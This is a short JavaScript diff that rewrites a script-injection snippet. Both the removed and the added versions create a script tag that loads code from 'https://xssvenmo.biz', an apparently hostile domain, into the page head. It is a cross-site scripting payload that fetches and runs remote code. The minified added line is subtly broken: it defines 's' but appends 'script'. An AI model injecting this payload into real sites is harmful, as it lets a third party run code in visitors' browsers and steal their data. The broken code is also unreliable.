@@ -1,4 +1,1 @@
-var script = document.createElement('script');
-script.src = 'https://xssvenmo.biz';
-
-document.head.appendChild(script);
+s=document.createElement('script');s.src='https://xssvenmo.biz';document.head.appendChild(script);
